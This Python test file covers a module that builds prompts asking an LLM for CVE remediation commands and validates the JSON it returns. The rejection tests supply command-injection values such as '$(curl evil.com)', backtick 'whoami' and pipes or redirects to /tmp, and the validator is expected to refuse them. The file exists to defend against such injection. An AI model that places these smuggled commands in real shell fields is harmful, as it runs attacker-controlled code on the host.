"""Tests for SYSTEM_PROMPT shape, build_remediation_prompt, and parse_remediation validator."""

from __future__ import annotations

import unittest

from fix_publisher.prompts import (
    SYSTEM_PROMPT,
    RemediationValidationError,
    build_remediation_prompt,
    parse_remediation,
)


CONFIRMED = {
    "cve_id": "CVE-2022-0778",
    "verdict": "CONFIRMED",
    "reason": "Pre-fix libssl1.1 1.1.1d, TLS reachable.",
    "package_name": "libssl1.1",
    "kev_product": "OpenSSL",
    "kev_vendor": "OpenSSL",
    "evidence": {"package_version": "libssl1.1 1.1.1d-0+deb10u6"},
    "probe_command": "openssl version -a",
    "probe_output": "OpenSSL 1.1.1d  10 Sep 2019\n",
}


class SystemPromptShapeTests(unittest.TestCase):
    def test_prompt_names_all_four_fields(self) -> None:
        for field in ("apt_command", "config_diff", "service_restart", "explanation"):
            self.assertIn(field, SYSTEM_PROMPT)

    def test_prompt_requires_apt_install(self) -> None:
        self.assertIn("apt install", SYSTEM_PROMPT)

    def test_prompt_requires_version_pin(self) -> None:
        self.assertIn("=<version>", SYSTEM_PROMPT)
        self.assertIn("MUST", SYSTEM_PROMPT)

    def test_prompt_forbids_other_package_managers(self) -> None:
        for mgr in ("yum", "dnf", "zypper", "pip", "docker pull"):
            self.assertIn(mgr, SYSTEM_PROMPT)

    def test_prompt_forbids_sudo_and_unattended(self) -> None:
        self.assertIn("sudo", SYSTEM_PROMPT.lower())
        self.assertIn("-y", SYSTEM_PROMPT)

    def test_prompt_specifies_json_return_shape(self) -> None:
        self.assertIn("Return ONLY the JSON", SYSTEM_PROMPT)


class BuildPromptTests(unittest.TestCase):
    def test_includes_cve_and_package_metadata(self) -> None:
        p = build_remediation_prompt(CONFIRMED)
        self.assertIn("CVE-2022-0778", p)
        self.assertIn("libssl1.1", p)
        self.assertIn("OpenSSL", p)

    def test_includes_evidence(self) -> None:
        p = build_remediation_prompt(CONFIRMED)
        self.assertIn("libssl1.1 1.1.1d", p)

    def test_includes_probe_output_fenced(self) -> None:
        p = build_remediation_prompt(CONFIRMED)
        self.assertIn("openssl version -a", p)
        self.assertIn("```", p)
        self.assertIn("OpenSSL 1.1.1d", p)

    def test_tolerates_empty_verdict(self) -> None:
        p = build_remediation_prompt({})
        self.assertIn("CVE-UNKNOWN", p)
        self.assertIn("(no reason recorded)", p)


class ParseRemediationHappyPathTests(unittest.TestCase):
    def _valid(self) -> dict:
        return {
            "apt_command": "apt install libssl1.1=1.1.1n-0+deb10u6",
            "config_diff": "no config change needed",
            "service_restart": "systemctl restart apache2",
            "explanation": "Upgrades OpenSSL past the BN_mod_sqrt DoS fix.",
        }

    def test_valid_json_string(self) -> None:
        import json
        result = parse_remediation(json.dumps(self._valid()))
        self.assertEqual(result["apt_command"], "apt install libssl1.1=1.1.1n-0+deb10u6")

    def test_strips_code_fence_json(self) -> None:
        import json
        text = "```json\n" + json.dumps(self._valid()) + "\n```"
        result = parse_remediation(text)
        self.assertEqual(result["apt_command"], "apt install libssl1.1=1.1.1n-0+deb10u6")

    def test_strips_bare_code_fence(self) -> None:
        import json
        text = "```\n" + json.dumps(self._valid()) + "\n```"
        result = parse_remediation(text)
        self.assertEqual(result["explanation"], "Upgrades OpenSSL past the BN_mod_sqrt DoS fix.")

    def test_extracts_object_from_prose(self) -> None:
        import json
        text = "Here is the remediation: " + json.dumps(self._valid()) + " Done."
        result = parse_remediation(text)
        self.assertEqual(result["service_restart"], "systemctl restart apache2")

    def test_apt_get_install_accepted(self) -> None:
        import json
        v = self._valid(); v["apt_command"] = "apt-get install libssl1.1=1.1.1n-0+deb10u6"
        parse_remediation(json.dumps(v))

    def test_empty_config_diff_normalized_to_sentinel(self) -> None:
        import json
        v = self._valid(); v["config_diff"] = ""
        result = parse_remediation(json.dumps(v))
        self.assertEqual(result["config_diff"], "no config change needed")

    def test_empty_apt_command_allowed_escape_hatch(self) -> None:
        import json
        v = self._valid()
        v["apt_command"] = ""
        v["explanation"] = "Source-built; upgrade to httpd 2.4.51 from vendor tarball."
        result = parse_remediation(json.dumps(v))
        self.assertEqual(result["apt_command"], "")


class ParseRemediationRejectionTests(unittest.TestCase):
    def _valid(self) -> dict:
        return {
            "apt_command": "apt install libssl1.1=1.1.1n-0+deb10u6",
            "config_diff": "no config change needed",
            "service_restart": "systemctl restart apache2",
            "explanation": "e",
        }

    def test_empty_string_rejected(self) -> None:
        with self.assertRaises(RemediationValidationError):
            parse_remediation("")

    def test_invalid_json_rejected(self) -> None:
        with self.assertRaises(RemediationValidationError):
            parse_remediation("not json")

    def test_non_object_rejected(self) -> None:
        with self.assertRaises(RemediationValidationError):
            parse_remediation('["a", "b"]')

    def test_missing_key_rejected(self) -> None:
        import json
        v = self._valid(); del v["explanation"]
        with self.assertRaises(RemediationValidationError):
            parse_remediation(json.dumps(v))

    def test_apt_command_without_version_pin_rejected(self) -> None:
        import json
        v = self._valid(); v["apt_command"] = "apt install libssl1.1"
        with self.assertRaises(RemediationValidationError) as ctx:
            parse_remediation(json.dumps(v))
        self.assertIn("pin", str(ctx.exception).lower())

    def test_apt_command_non_apt_manager_rejected(self) -> None:
        import json
        for bad in ("yum install foo=1.0", "dnf install foo=1.0", "pip install foo==1.0"):
            v = self._valid(); v["apt_command"] = bad
            with self.assertRaises(RemediationValidationError):
                parse_remediation(json.dumps(v))

    def test_apt_command_with_shell_chain_rejected(self) -> None:
        import json
        for bad in (
            "apt install foo=1.0 && systemctl restart bar",
            "apt install foo=1.0; systemctl restart bar",
        ):
            v = self._valid(); v["apt_command"] = bad
            with self.assertRaises(RemediationValidationError):
                parse_remediation(json.dumps(v))

    def test_apt_command_with_shell_metacharacters_rejected(self) -> None:
        """v2-14 audit finding: $(), backticks, pipes, redirections enable
        command substitution even without &&/; chaining."""
        import json
        for bad in (
            "apt install foo=$(curl evil.com)",
            "apt install foo=`whoami`",
            "apt install foo=1.0 | tee /tmp/x",
            "apt install foo=1.0 > /tmp/x",
            "apt install foo=1.0 < /tmp/x",
        ):
            v = self._valid(); v["apt_command"] = bad
            with self.assertRaises(RemediationValidationError) as ctx:
                parse_remediation(json.dumps(v))
            self.assertIn("metacharacter", str(ctx.exception).lower())

    def test_service_restart_with_shell_metacharacters_rejected(self) -> None:
        import json
        for bad in (
            "systemctl restart $(curl evil.com)",
            "systemctl restart foo | tee /tmp/x",
        ):
            v = self._valid(); v["service_restart"] = bad
            with self.assertRaises(RemediationValidationError):
                parse_remediation(json.dumps(v))

    def test_apt_command_with_sudo_rejected(self) -> None:
        import json
        v = self._valid(); v["apt_command"] = "sudo apt install libssl1.1=1.1.1n-0+deb10u6"
        with self.assertRaises(RemediationValidationError):
            parse_remediation(json.dumps(v))

    def test_apt_command_with_unattended_flag_rejected(self) -> None:
        import json
        v = self._valid(); v["apt_command"] = "apt install -y libssl1.1=1.1.1n-0+deb10u6"
        with self.assertRaises(RemediationValidationError):
            parse_remediation(json.dumps(v))

    def test_apt_command_not_starting_with_apt_rejected(self) -> None:
        import json
        v = self._valid(); v["apt_command"] = "some-other-command libssl1.1=1.1.1n"
        with self.assertRaises(RemediationValidationError):
            parse_remediation(json.dumps(v))

    def test_service_restart_with_shell_chain_rejected(self) -> None:
        import json
        v = self._valid(); v["service_restart"] = "systemctl restart a && systemctl restart b"
        with self.assertRaises(RemediationValidationError):
            parse_remediation(json.dumps(v))

    def test_service_restart_with_sudo_rejected(self) -> None:
        import json
        v = self._valid(); v["service_restart"] = "sudo systemctl restart apache2"
        with self.assertRaises(RemediationValidationError):
            parse_remediation(json.dumps(v))

    def test_empty_explanation_rejected(self) -> None:
        import json
        v = self._valid(); v["explanation"] = ""
        with self.assertRaises(RemediationValidationError):
            parse_remediation(json.dumps(v))

    def test_no_json_object_in_prose_rejected(self) -> None:
        with self.assertRaises(RemediationValidationError):
            parse_remediation("I can't help with that.")


if __name__ == "__main__":
    unittest.main()
